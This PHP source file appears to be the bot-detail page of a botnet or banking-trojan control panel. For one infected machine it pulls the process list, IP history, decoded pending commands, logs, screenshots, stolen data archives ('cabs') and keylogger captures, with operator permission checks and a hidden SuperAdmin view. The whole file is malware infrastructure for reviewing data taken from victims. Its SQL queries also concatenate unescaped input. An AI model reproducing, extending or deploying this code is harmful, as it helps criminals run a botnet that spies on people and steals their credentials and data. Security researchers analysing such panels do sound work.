<?php
get_function('ts2str');

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

include_once('modules/bots/country_code.php');

function time_check($key, $value){
	global $text_time;
	$return = '';
	switch(strlen($value)){
		case '1':
			$return = $text_time[$key][$value];
		break;
	
		case '2':
			if(isset($text_time[$key][$value])){
				$return = $text_time[$key][$value];
			}else{
				$return = time_check($key, substr($value, strlen($value)-1, strlen($value)));
			}
		break;
	
		default:
			$return = time_check($key, substr($value, strlen($value)-2, strlen($value)));
		break;
	}
	return $return;
}

function time_math($s){
	global $text_time;

	$text_time['day'] = array('0' => 'дней', '1' => 'день', '2' => 'дня', '3' => 'дня', '4' => 'дня', '5' => 'дней', '6' => 'дней', '7' => 'дней', '8' => 'дней', '9' => 'дней', '11' => 'дней', '12' => 'дней', '13' => 'дней', '14' => 'дней');
	$text_time['hour'] = array('0' => 'часов', '1' => 'час', '2' => 'часа', '3' => 'часа', '4' => 'часа', '5' => 'часов', '6' => 'часов', '7' => 'часов', '8' => 'часов', '9' => 'часов', '11' => 'часов', '12' => 'часов', '13' => 'часов', '14' => 'часов');
	$text_time['min'] = array('0' => 'минут', '1' => 'минута', '2' => 'минуты', '3' => 'минуты', '4' => 'минуты', '5' => 'минут', '6' => 'минут', '7' => 'минут', '8' => 'минут', '9' => 'минут', '11' => 'минут', '12' => 'минут', '13' => 'минут', '14' => 'минут');
	$text_time['sec'] = array('0' => 'секунд', '1' => 'секунда', '2' => 'секунды', '3' => 'секунды', '4' => 'секунды', '5' => 'секунд', '6' => 'секунд', '7' => 'секунд', '8' => 'секунд', '9' => 'секунд', '11' => 'секунд', '12' => 'секунд', '13' => 'секунд', '14' => 'секунд');

	$time['sec'] =  $s%60;
	$m = floor($s/60);
	$time['min'] = $m%60;
	$m = floor($m/60);
	$time['hour'] = $m%24;
	$time['day'] = floor($m/24);
	$time = array_reverse($time);
	
	$return = '';
	foreach($time as $key => $value){
		if($value != '0'){
			if(!empty($return)) $return .= ', ';
			$return .= $value . ' ' . time_check($key, $value);
		}
	}
	
	return $return;
}

if(!empty($Cur['id'])){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	if($bot->id != $Cur['id']) $smarty->assign('nobot', true);
	if($_SESSION['user']->config['hunter_limit'] == true) if($bot->post_id != $_SESSION['user']->id) $smarty->assign('nobot', true);
}elseif(!empty($Cur['str'])){
	$matches = explode('0', $Cur['str'], 2);
	
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}

	if(!empty($prefix) && !empty($uid)){
		$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') LIMIT 1');
		if($bot->prefix != $prefix || $bot->uid != $uid) $smarty->assign('nobot', true);
		if($_SESSION['user']->config['hunter_limit'] == true) if($bot->post_id != $_SESSION['user']->id) $smarty->assign('nobot', true);
	}else{
		$smarty->assign('nobot', true);
	}
}

if($smarty->tpl_vars['nobot']->value != true){
	$bot->plist = $mysqli->query_name('SELECT plist FROM bf_process WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') LIMIT 1', null, 'plist');
	$bot->plist = explode(',', $bot->plist);
	if(empty($bot->plist[0])) unset($bot->plist[0]);
	$bot->country = $country_code[$bot->country];
	
	$bot->ips = $mysqli->query('SELECT * FROM bf_bots_ip WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\')', null, null, false);
	
	if(strpos($bot->cmd, '$') === 0) $bot->cmd = '';
	if($config['scramb'] == true){
		get_function('rc');
		
		if(strpos($bot->cmd, '!!!') === 0){
			$bot->cmd = '!!!' . rc_decode(str_replace('!!!', '', $bot->cmd));
		}elseif(strpos($bot->cmd, '!!') === 0){
			$bot->cmd = '!!' . rc_decode(str_replace('!!', '', $bot->cmd));
		}elseif(strpos($bot->cmd, '!') === 0){
			$bot->cmd = '!' . rc_decode(str_replace('!', '', $bot->cmd));
		}else{
			$bot->cmd = rc_decode($bot->cmd);
		}
	}else{
		if(strpos($bot->cmd, '!!!') === 0){
			$bot->cmd = '!!!' . str_replace('!!!', '', $bot->cmd);
		}elseif(strpos($bot->cmd, '!!') === 0){
			$bot->cmd = '!!' . str_replace('!!', '', $bot->cmd);
		}elseif(strpos($bot->cmd, '!') === 0){
			$bot->cmd = '!' . str_replace('!', '', $bot->cmd);
		}else{
			$bot->cmd = $bot->cmd;
		}
	}

	$bot->live_time_bot = time_math($bot->last_date - $bot->post_date);

	$bot->min_post = ($bot->min_post == 0) ? '-' : time_math($bot->min_post);
	$bot->max_post = ($bot->max_post == 0) ? '-' : time_math($bot->max_post);

	$bot->logs = @scandir('logs/bots/' . $bot->prefix . '/' . $bot->uid . '/', false);
	unset($bot->logs[0], $bot->logs[1]);
	
	if($config['heap'] == 1){
		$bot->heaps = glob('logs/heap/*/' . $bot->prefix . $bot->uid . '.txt', GLOB_BRACE);
	}
	
	$bot->screens = $mysqli->query('SELECT file,post_date FROM bf_screens WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') ORDER by post_date ASC', null, null, false);
	//$bot->screens_logs = $mysqli->query('SELECT `desc`, `type`, `file`, `post_date` FROM bf_screens_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') ORDER by post_date ASC', null, null, false);

	$bot->post_date = TimeStampToStr($bot->post_date, '+3');
	$bot->last_date = TimeStampToStr($bot->last_date, '+3');
	
	$bot->hunter = $mysqli->query_name('SELECT login FROM bf_users WHERE (id = \''.$bot->post_id.'\') LIMIT 1', null, 'login', '');
	$bot->comment = $mysqli->query_name('SELECT comment FROM bf_comments WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (type = \'10\') LIMIT 1', null, 'comment', '');
	
	if($_SESSION['user']->access['cabs']['index'] == 'on'){
		if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
			$bot->cabs = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = a.type) LIMIT 1) comment FROM bf_cabs a WHERE (a.prefix = \''.$bot->prefix.'\') AND (a.uid = \''.$bot->uid.'\') AND (a.ready = \'1\') GROUP by a.type', null, null, false);
		}else{
			$bot->cabs = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = a.type) LIMIT 1) comment FROM bf_cabs a WHERE (a.chk = \'0\') AND (a.prefix = \''.$bot->prefix.'\') AND (a.uid = \''.$bot->uid.'\') AND (a.ready = \'1\') GROUP by a.type', null, null, false);
		}
	}
	
	if($_SESSION['user']->access['keylog']['index'] == 'on'){
		$bot->keylog = $mysqli->query('SELECT a.id, a.hash, a.post_date, COUNT(a.screen_md5) count, c.name, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.uniq = MD5(concat(a.hash,a.shash))) AND (b.type = \'9\') LIMIT 1) comment FROM bf_keylog_data a, bf_keylog c WHERE (a.prefix = \''.$bot->prefix.'\') AND (a.uid = \''.$bot->uid.'\') AND (c.hash = a.hash) GROUP by a.hash ORDER by a.post_date', null, null, false);
		//$bot->keylog = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = a.type) LIMIT 1) comment FROM bf_cabs a WHERE (a.prefix = \''.$bot->prefix.'\') AND (a.uid = \''.$bot->uid.'\') AND (a.ready = \'1\') GROUP by a.type', null, null, false);
	}
	
	$smarty->assign('bot', $bot);
}else{
	$bot_uid = $mysqli->query('SELECT * FROM bf_bots WHERE (uid = \''.$uid.'\') LIMIT 1');
	
	if($bot_uid->uid == $uid) $smarty->assign('bot_uid', $bot_uid);
}

?>